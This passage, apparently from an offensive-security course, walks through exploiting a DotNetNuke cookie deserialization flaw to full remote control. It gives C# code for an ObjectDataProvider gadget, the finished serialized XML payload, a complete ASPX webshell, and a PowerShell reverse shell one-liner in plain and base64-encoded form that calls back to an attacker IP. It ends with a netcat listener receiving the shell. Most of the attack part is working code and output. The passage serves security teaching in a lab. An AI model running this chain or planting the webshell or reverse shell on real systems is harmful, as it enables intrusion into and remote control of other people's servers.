09: namespace ExpWrapSerializer
10: {
11:     class Program
12:     {
13:         static void Main(string[] args)
14:         {
15:             //Serialize();
16:             Deserialize();
17:         }
18: 
19:         public static void Deserialize()
20:         {
21:             string xmlSource = System.IO.File.ReadAllText("C:\\Users\\Public\\ExpWrap.txt");
22:             Globals.DeserializeHashTableXml(xmlSource);
23:         }
24: 
25:         public static void Serialize()
26:         {
27:             ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
28:             myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
29:             myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
30:             myExpWrap.ProjectedProperty0.MethodName = "PullFile";
31:             myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
32:             myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
33: 
34: 
35:             Hashtable table = new Hashtable();
36:             table["myTableEntry"] = myExpWrap;
37:             String payload = XmlUtils.SerializeDictionary(table, "profile");
38:             TextWriter writer = new StreamWriter("C:\\Users\\Public\\ExpWrap.txt");
39:             writer.Write(payload);
40:             writer.Close();
41: 
42:             Console.WriteLine("Done!");
43:         }
44: 
45:     }
46: }
Listing 23 - Testing the DNN deserialization of our ExpandedWrapper object

Notice that in Listing 23 on line 19, we have implemented a simple Deserialize function. This function reads the serialized ExpandedWrapper object we have previously created from a file and uses the native DNN function to start the deserialization process. You will recall that this is the same function that is called in the LoadProfile (Figure 7) function we identified as the entry point for our vulnerability analysis at the beginning of this module.

If we run this compiled application under dnSpy and set a breakpoint on the InvokeMember function call inside ObjectDataProvider.InvokeMethodOnInstance, we can indeed validate that the deserialization is proceeding as we hoped for by looking at the call stack (Figure 41).

Figure 41: Deserialization of the ExpandedWrapper object
Figure 41: Deserialization of the ExpandedWrapper object
Moreover Figure 42 shows that the myODPTest.txt file is being downloaded again from our webserver, indicating the PullFile method has been successfully triggered during the deserialization process.

Figure 42: Webserver log indicates successful code execution during deserialization
Figure 42: Webserver log indicates successful code execution during deserialization
Now that we have constructed and validated a working payload, it is finally time to put everything together and test it against our DNN server.

Exercise
Repeat the steps described in the previous section and ensure that the generated payload is working as intended.

1
(Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.data.services.internal.expandedwrapper-2?view=netframework-4.7.2 ↩︎

2
(Microsoft, 2020), https://referencesource.microsoft.com/#System.Data.Services/System/Data/Services/Internal/ExpandedWrapper.cs ↩︎

3
(Microsoft, 2015), https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/projection-operations ↩︎

4
(OakLeaf Systems, 2010), http://oakleafblog.blogspot.com/2010/07/windows-azure-and-cloud-computing-posts_22.html ↩︎

4.4. Putting It All Together
At this point we can set up the entire attack and try to gain a reverse shell using this vulnerability. In order to do that, we will use a ASPX command shell that can be found on our attacking Kali VM. We'll copy that into our webserver root directory and make sure we set the correct permissions on it.

kali@kali:~$ locate cmdasp.aspx
/usr/share/webshells/aspx/cmdasp.aspx

kali@kali:~$ cat /usr/share/webshells/aspx/cmdasp.aspx
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>

<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
<!--    http://michaeldaw.org   04/2007    -->

kali@kali:~$ sudo cp /usr/share/webshells/aspx/cmdasp.aspx /var/www/html/

kali@kali:~$ sudo chmod 644 /var/www/html/cmdasp.aspx
Listing 24 - Setting up our attacking webserver

We'll use our application to serialize the ExpandedWrapper object again, making sure that we modify the URL and the file name we use in the MethodName parameters. As a result, we should see a serialized object similar to the following:

<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.119.120/cmdasp.aspx</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
Listing 25 - A payload that will upload an ASPX command shell to the DNN server from our Kali VM

Please keep in mind that the reason we can write to the DNN root directory is due to the permissions we had to give to the IIS account, per DNN installation instructions:

the website user account must have Read, Write, and Change Control of the root website directory and subdirectories ( this allows the application to create files/folders and update its config files)

We can now modify a HTTP request as we did earlier in this module and send it to our target. This time however we will use our serialized object as the DNNPersonalization cookie value.

Figure 43: Sending our final payload to the DNN webserver
Figure 43: Sending our final payload to the DNN webserver
Everything should have worked as expected at this point and our malicious payload should have executed as expected. We can confirm that by looking at the webserver log file, which indicates that our ASPX shell has been downloaded.

192.168.121.120 - - [07/Sep/2018:13:31:13 -0700] "GET /cmdasp.aspx HTTP/1.1" 200 1662 "-" "-"
Listing 26 - Our malicious ASPX shell has been downloaded by the DNN web application

Finally, we can validate our attack success by browsing to our newly uploaded webshell.

Figure 44: Our ASPX command shell can be accessed on the DNN webserver
Figure 44: Our ASPX command shell can be accessed on the DNN webserver
At this point, we can execute any command of our choosing. In order to wrap up our attack we will execute a PowerShell reverse shell command1 and make sure we receive that shell on our Kali VM.

The following listing shows the Powershell reverse shell one-liner command we will use:

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.45.210',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
```
Listing 27 - Plaintext version of the Powershell one-liner we will use for our reverse shell.

To avoid any possible quotation and encoding issues while passing the above complex command to the webshell, we are going to encode it to base64 format, since the PowerShell executable accepts the –EncodedCommand parameter, which instructs the interpreter to base64-decode the command before executing it. Please also note that PowerShell uses the Little Endian UTF-16 encoding version, which is reflected in the iconv command in the following listing.

kali@kali:~$ cat powershellcmd.txt 
$client = New-Object System.Net.Sockets.TCPClient('192.168.119.120',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};

```
kali@kali:~$ iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAwACcALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsACgA=
```
Listing 28 - The command used to encode our reverse shell

The final command we will execute from the webshell then looks like the following:

```
powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAwACcALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsACgA=
```
Listing 29 - PowerShell reverse shell we will execute in our ASPX command shell

Finally, our exploit is complete and we successfully receive our reverse shell.

kali@kali:~$ nc -lvp 4444
[sudo] password for kali: 
listening on [any] 4444 ...
connect to [192.168.119.120] from WIN-2TU088Q2N5H.localdomain [192.168.121.120] 54654
whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> exit
kali@kali:~$ 
Listing 30 - Our exploit has worked and we have received a shell


ysoserial.net
Now that we have manually analyzed and exploited this vulnerability, and have gained a thorough understanding of the ObjectDataProvider gadget mechanics, we need to mention a tool that can automate many of these tasks for us. Using the original ysoserial Java payload generator2 as inspiration, researcher Alvaro Muñoz also created the ysoserial.net3 payload generator that, as the name implies, specifically targets unsafe object deserialization in .Net applications.

In addition to the gadget we used in this module, ysoserial.net includes additional gadgets that can be useful to an attacker if certain conditions are present in a vulnerable application. We strongly encourage you to inspect the payloads it offers as well as the inner workings of this tool, as it will enhance your knowledge and allow you to possibly exploit a variety of different .Net deserialization vulnerabilities.

1
(Nikhil Mittal, 2018), https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1 ↩︎

2
(Chris Frohoff, 2019), https://github.com/frohoff/ysoserial ↩︎

3
(Alvaro Muñoz, 2020), https://github.com/pwntester/ysoserial.net ↩︎


